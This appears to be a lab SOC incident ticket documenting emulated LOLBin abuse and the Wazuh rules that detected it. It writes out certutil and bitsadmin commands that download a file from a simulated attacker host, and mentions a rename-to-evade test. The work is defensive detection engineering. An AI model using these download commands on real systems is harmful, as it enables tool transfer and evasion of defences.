# 🚨 SOC Incident Ticket: IR-2026-10-001
**Title:** LOLBin Abuse for Defense Evasion & Ingress Tool Transfer (BITSAdmin / Certutil)
**Severity:** Medium-High
**Status:** RESOLVED — Detections validated in simulated environment; manual remediation applied
**Analyst:** Edgar Yair Rosas Flores (Tier 2 / Detection Engineer)
**Report Date:** Oct 2, 2026

## 1. Executive Summary
During threat hunting exercises conducted across two lab sessions (Sep 26 and Oct 2, 2026) under an assume-breach methodology, two related Living-off-the-Land (LOLBin) techniques were emulated and successfully detected on endpoint `DESKTOP-0MKICAR`: abuse of `certutil.exe` for ingress tool transfer (T1105) and abuse of `bitsadmin.exe` for background file transfer as a defense-evasion technique (T1197). Both activities were confirmed as true positives via custom Wazuh detection rules and corroborated with host-level and network-level evidence.

## 2. Affected Assets
- **Hostname:** DESKTOP-0MKICAR (Windows 10)
- **IP Address:** 192.168.56.20
- **Wazuh Agent ID:** 001
- **Simulated attacker infrastructure:** 192.168.56.10 (Kali Linux, `python3 -m http.server`)

## 3. Incident Timeline & Kill Chain

### Session 1 — Sep 26, 2026 (Fase F)
- `certutil.exe` executed: `certutil.exe -urlcache -split -f http://192.168.56.10/payload.txt C:\Windows\Temp\payload.txt`
- Artifact dropped: `C:\Windows\Temp\payload.txt` (1KB, PoC content)
- **Detection:** rule `100050` fired, matching on `win.eventdata.originalFileName` (PE header) rather than process name alone — hardened against renaming evasion (validated by renaming `certutil.exe` to `actualizador.exe`, alert still fired)

### Session 2 — Oct 2, 2026 (Fase J)
- `bitsadmin.exe` executed: `bitsadmin /transfer backdoor /download /priority normal http://192.168.56.10/payload.txt C:\Windows\Temp\bits_payload.txt`
- Transfer confirmed complete (24/24 bytes, 100%) per `bitsadmin` CLI output
- **Detection:** rule `100070` fired 3 times across repeated executions (13:45:48, 13:58:52, 13:58:58, hora local del lab), matching Sysmon Event ID 7 image-load telemetry for `bitsadmin.exe` loading its BITS COM proxy module (identified in telemetry as "Background Intelligent Transfer Service Proxy")
- **Note:** first detection exhibited several minutes of latency, consistent with Sysmon's signature-verification overhead under constrained host memory (~2.3GB free with 3 VMs concurrently active)

## 5. Containment and Remediation
1. Detection rules `100050` and `100070` validated and hardened (PCRE2 regex, PE-header-based matching for certutil) to reduce false positives from legitimate OS/software updates.
2. Dropped artifacts manually removed from `C:\Windows\Temp\` as part of lab cleanup.
3. **Recommended next step (not yet implemented):** extend the existing Active Response (currently scoped to RDP brute-force rule `100010`) to also trigger automated host isolation on rules `100050`/`100070`.

## 6. Lessons Learned / Analyst Notes
- Initial hypothesis for rule `100070` — that `bitsadmin.exe` would load a network-transfer DLL directly — needed empirical correction: Sysmon Event ID 7 actually captured the load of the BITS COM proxy stub, since the real network transfer executes inside the BITS service under a shared `svchost.exe`, not inside `bitsadmin.exe` itself.
- `wazuh-logtest` validates rule *syntax*, not telemetry *assumptions* — always confirm against real Event Viewer output before trusting a synthetic test log.
- Detection latency (~minutes on cold module cache) should be documented as part of MTTD baselining rather than hidden from the report.
